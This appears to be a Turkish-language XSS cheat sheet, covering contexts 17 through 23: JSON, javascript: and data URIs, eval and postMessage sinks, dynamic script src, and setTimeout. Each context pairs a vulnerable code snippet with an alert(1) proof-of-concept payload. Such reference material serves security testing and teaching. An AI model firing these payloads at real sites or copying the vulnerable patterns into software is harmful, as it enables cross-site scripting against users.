<h1>CONTEXTS</h1>
<br>

<h2>🔹 17. JavaScript Object Context (JSON gibi)</h2>
<h4>Input bir JSON içeriği içinde döner ama frontend JS bu veriyi parse edip kullanırsa, XSS olur.</h4><br>

📌 Örnek:  
`{"name":"PAYLOAD"}`  
<br>
🎯 Exploit:  
```html
\";alert(1);//
```
<br>



<h2>🔹 18. JavaScript URI inside <form> / <object> / <embed></h2>
<h4>Form Action veya Embed src attribute’larında javascript veya data URI kullanımı</h4><br>

📌 Örnek:  
`<form action="javascript:alert(1)">`  
veya  
`<embed src="data:text/html;base64,...">`
<br>

🎯 Exploit:  
```html
javascript:alert(1)
```
<br> 



<h2>🔹 19. Base64 / Data URI Context</h2>
<h4>Bazı yerlerde data: URL ile XSS yapılabilir.</h4><br>

📌 Örnek:  
`<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>`  
<br>
🎯 Exploit:  
```html
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```
veya
```html
data:text/html,<script>alert(1)</script>
```

<br>


<h2>🔹 20. XHR / Fetch Injection via DOM Sinks</h2>
<h4>JS içindeki fetch(), XMLHttpRequest(), document.write(), eval() gibi API'ler üzerinden input kullanılıyorsa DOM XSS riski vardır.</h4><br>

📌 Örnek:  
`eval(location.hash.substring(1))`
<br>  
🎯 Exploit:  
```bash
http://site.com/#alert(1)
```
<br>



<h2>🔹 21. WebSocket / PostMessage / Custom Protocol Context</h2>
<h4>Az bilinir ama bazı uygulamalar postMessage, websocket içeriği olarak input’u alır ve DOM’a yansıtırsa yine XSS doğar.</h4><br>

📌 Örnek:  
```js
window.addEventListener("message", e => {
  document.body.innerHTML = e.data;
});
```
<br>

🎯 Exploit:  
```html
<img src=x onerror=alert(1)>
```
<br>



<h2>🔹 22. Script src dynamically built</h2>
<h4>JavaScript ile dinamik olarak oluşturulan script tag’larının src attribute’u kullanıcı girdisi<br>
ile inşa edilirse, zararlı kaynaklar yüklenebilir veya kod enjeksiyonu yapılabilir.</h4>
  <br>

📌 Örnek:  
```js
var script = document.createElement("script");
script.src = "/api/" + userInput;
document.body.appendChild(script);
```
<br>
🎯 Exploit:  

```html
";alert(1)//
```
<br>



<h2>🔹 23. SetTimeout / setInterval / Function constructor</h2>
<h4>setTimeout(), setInterval(), Function() gibi fonksiyonlara kullanıcı girdisi doğrudan kod olarak verilirse, XSS oluşur.</h4><br>

📌 Örnek:  
`setTimeout(userInput, 1000)`  
<br>
🎯 Exploit:  
```js
alert(1)
```
<br>
